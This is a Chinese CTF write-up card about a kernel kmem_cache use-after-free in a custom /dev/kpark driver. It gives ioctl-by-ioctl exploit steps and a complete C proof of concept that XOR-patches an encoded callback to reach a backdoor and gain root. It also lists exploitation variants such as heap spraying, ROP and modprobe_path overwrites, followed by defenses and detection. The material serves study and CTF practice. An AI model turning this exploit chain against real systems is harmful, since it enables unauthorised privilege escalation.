---
id: binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack
title: 内核 kmem_cache UAF + 同池对象复用：泄露 encoded_cb 并 XOR 改写成后门提权
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-kmem-cache-uaf-encoded-callback-hijack
tags:
- kernel
- pwn
- uaf
- kmem-cache
- ioctl
- encoded-callback
- xor
- root
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V78
  verified_at: '2026-11-05T16:38:14+08:00'
  notes: 已对照原文与12张图核对：kpark_ioctl 的 add/del/read/write/action/call 命令、delete note 后 notes[idx] 未清空的 UAF、note/action 同 kmem_cache 64 字节复用、encoded_cb=safe_cb^global_cookie^object_cookie、以 0x60^0x520=0x540 异或改写跳 kpark_prize、prepare_kernel_cred+commit_creds 提权均一致；图11 exp 实测 uid=0 并读出 flag=local_test_kernel_uaf_to_root。未验证点：未在本机重跑 QEMU 靶场；CTF 自定义模块无版本区间，未设 affected_versions；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-kmem-cache-uaf-encoded-callback-hijack/
draft: false
kb_aliases:
- 内核 UAF
- kmem_cache 对象复用
- encoded_cb 劫持
- kpark 内核题
- ioctl UAF 提权
- safe_cb 异或后门
---

## 一句话结论

驱动删除 note 时 `kmem_cache_free` 后没有清空 `notes[idx]`，形成 UAF；同大小、同 `kpark_cache` 的 action 对象会复用该 chunk，于是残留的 note 指针可读出 action 的 `encoded_cb`，再用 `write_note` 把 `encoded_cb` 异或上 `safe_cb ^ kpark_prize` 的偏移差，`call_action` 解码后即跳到后门函数 `kpark_prize`，执行 `commit_creds(prepare_kernel_cred(&init_task))` 提权。

## 原理

- 驱动用 `kmem_cache_create` 创建 `kpark_cache`，note 和 action 都从同一 cache 分配，大小均为 64 字节；`delete(note)` 分支只调用 `kmem_cache_free`，没有把 `notes[idx]` 置 NULL，也没有清空对象内容。
- SLUB 分配器在 free 后把 chunk 放回 freelist；下一次同 cache、同大小的 `add_action` 很可能取回同一个 chunk。此时 `notes[idx]` 仍指向该 chunk，但内容已经被 action 结构覆盖，形成 type confusion / UAF 读。
- `read_note` 把 `notes[idx]` 的内容拷回用户态，于是泄露 action 的 `magic`、`encoded_cb`、`object_cookie`、`printer` 与 `name`。
- action 的回调不是明文函数指针，而是 `encoded_cb = safe_cb ^ global_cookie ^ object_cookie`；调用时再异或 `global_cookie ^ object_cookie` 还原。由于 `global_cookie` 难泄露，攻击者不需要还原它，只需要利用异或的线性：`encoded_cb ^ (safe_cb ^ kpark_prize)` 解码后就是 `kpark_prize`。
- `safe_cb` 与 `kpark_prize` 都在同一模块内，地址为 `module_base + 0x60` 与 `module_base + 0x520`；两者异或时模块基址抵消，差值恒为 `0x60 ^ 0x520 = 0x540`，因此不需要泄露模块基址，也不受模块 KASLR 影响。
- 注意必须用**异或**而不是减法：`0x520 - 0x60 = 0x4C0` 是错误值；异或满足 `(base+0x60) ^ (base+0x520) = 0x60 ^ 0x520`，与 base 无关。
- `call_action` 只检查 `magic == 0x4B5041524B323032`，不校验 `encoded_cb` 的合法性；攻击者写回时保留 magic 与原 `printer`，只改 `encoded_cb`，即可通过检查并调用后门。
- 后门 `kpark_prize` 直接调用 `prepare_kernel_cred(&init_task)` + `commit_creds`，等价于把当前进程 cred 替换为 root；在关闭 KASLR、开启 SMEP/SMAP 的 QEMU 环境中也能直接执行，因为这是合法内核函数调用而非用户态地址跳转。

## 触发条件

- 内核模块提供 note/action 两类对象，均从同一 `kmem_cache` 分配，且 delete 后不清空全局指针（UAF）。
- 用户可通过 `ioctl` 对对象进行 create/delete/read/write/call 操作，read/write 能访问已释放 chunk 的内容。
- action 结构中有可被覆盖的函数指针/编码回调，且调用路径缺少 magic 之外的完整性校验。
- 模块内存在可直接提权的后门函数（或攻击者可构造 ROP/内核 shellcode）。
- 设备节点对普通用户可读写（CTF 环境常见）。

## 利用步骤

1. 打开设备 `/dev/kpark`，确认 ioctl 命令与 `kpark_req` 结构：
   ```c
   struct kpark_req { uint32_t idx; uint32_t padding; uint64_t size; uint64_t addr; };
   ```
2. 分配 note 0：`ioctl(fd, 0x4018b701, &req{idx=0})`。
3. 释放 note 0：`ioctl(fd, 0x4018b702, &req{idx=0})`，此时 `notes[0]` 成为悬空指针。
4. 分配 action 1：`ioctl(fd, 0x4018b705, &req{idx=1})`，让 action 复用 note 0 的 chunk。
5. 通过 note 0 读出 action 1 的内容：`ioctl(fd, 0xc018b703, &req{idx=0, size=64, addr=&obj})`，得到 `magic/encoded_cb/object_cookie/printer/name`。
6. 修改 `encoded_cb ^= (0x520 ^ 0x60)`，保留 magic 与其他字段；通过 note 0 写回：`ioctl(fd, 0x4018b704, &req{idx=0, size=64, addr=&obj})`。
7. 调用 action 1：`ioctl(fd, 0x4018b707, &req{idx=1})`，驱动解码后跳到 `kpark_prize`，执行提权。
8. `getuid()` 应为 0，读取 `/flag` 验证。

## PoC

```c
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define DEV "/dev/kpark"
#define ADD_NOTE   0x4018b701
#define DEL_NOTE   0x4018b702
#define READ_NOTE  0xc018b703
#define WRITE_NOTE 0x4018b704
#define ADD_ACTION 0x4018b705
#define CALL       0x4018b707

struct req { uint32_t idx, pad; uint64_t size, addr; };
struct action {
    uint64_t magic, encoded_cb, object_cookie;
    void *printer;
    char name[32];
};

static int fd;
static long cmd(unsigned long c, uint32_t idx, void *buf, uint64_t len) {
    struct req r = { .idx = idx, .size = len, .addr = (uint64_t)buf };
    return ioctl(fd, c, &r);
}

int main(void) {
    fd = open(DEV, O_RDWR);
    if (fd < 0) return 1;

    cmd(ADD_NOTE, 0, NULL, 0);      // notes[0] 分配
    cmd(DEL_NOTE, 0, NULL, 0);      // free 但 notes[0] 未清空 -> UAF
    cmd(ADD_ACTION, 1, NULL, 0);    // action 复用同一 chunk

    struct action a;
    memset(&a, 0, sizeof(a));
    cmd(READ_NOTE, 0, &a, sizeof(a));   // 通过悬空 note 读 action
    printf("magic=%#lx encoded_cb=%#lx cookie=%#lx printer=%p\n",
           a.magic, a.encoded_cb, a.object_cookie, a.printer);

    a.encoded_cb ^= (0x520 ^ 0x60);     // safe_cb -> kpark_prize，异或差 0x540
    cmd(WRITE_NOTE, 0, &a, sizeof(a));  // 覆盖 action 的 encoded_cb
    cmd(CALL, 1, NULL, 0);              // 调用后门，commit_creds(prepare_kernel_cred)

    printf("uid=%d\n", getuid());
    if (getuid() == 0) system("cat /flag");
    return 0;
}
```

```text
# 预期输出
magic=0x4b5041524b323032 encoded_cb=0x... cookie=0x... printer=0xffffffffc0000080
uid=0
local_test_kernel_uaf_to_root
```

## 变体与关联

- 变体：note/action 大小不同或 cache 不同，需要堆风喷（`msg_msg`、`pipe_buffer`、`tty_struct`、`seq_operations`）做跨 cache 复用；本卡利用同 cache 直接复用。
- 变体：没有后门函数时，泄露内核基址后构造 ROP 链（`commit_creds`/`prepare_kernel_cred`），或用 `modprobe_path`/`core_pattern` 覆写；SMEP/SMAP 开启时不能直接跳用户态。
- 变体：`encoded_cb` 的 cookie 若可泄露，可直接算出函数地址；若不可泄露，利用异或差绕过的思路可推广到任何“编码回调”场景。
- 变体：若 delete 时清空指针但对象内容未清，仍可能有 use-after-free 读；若 `init_on_free=1`，本利用失效，需要换其他漏洞。
- 关联：[[binary-pwn-kernel-cve-2026-31431-page-cache-poisoning-lpe]]（另一类内核提权）、[[code-analysis-reverse-windows-kernel-debugging-vmware-windbg]]（内核调试环境搭建，用户态 Windows 场景可参考 GDB/符号思路）。
- 边界：内核开启 KASLR 且模块基址未知时，本利用仍成立（异或差与基址无关）；但若 `encoded_cb` 的 cookie 参与方式被修改、delete 清空指针、cache 隔离（`CONFIG_SLAB_FREELIST_HARDENED` + `init_on_free`）或 action 分配不到同一 chunk 时，链会中断。

## 检测与防御

- **模块代码**：delete 时把全局指针置 NULL 并清空对象（`kzalloc`/`memset`）；对 `idx` 做边界检查；action 调用前校验回调地址位于模块 `.text` 范围，而不仅校验 magic。
- **内核加固**：开启 `CONFIG_SLAB_FREELIST_HARDENED`、`CONFIG_SLAB_FREELIST_RANDOM`、`init_on_free=1`、KASAN；限制 `/dev/*` 设备权限，普通用户不可读写；启用模块签名与只读内核。
- **检测**：内核日志中的 slab UAF/KASAN 报告、异常 ioctl 频率与 idx 越界、进程从普通用户突然获得 root（`commit_creds` 调用链）、可疑模块加载与非官方 `.ko`。
- **CTF/研究环境**：用 QEMU + GDB 观察 `kmem_cache_alloc/free` 与 chunk 复用；在 exploit 前用 `pwndbg`/`tele` 确认 action 对象字段布局与 `encoded_cb` 值。

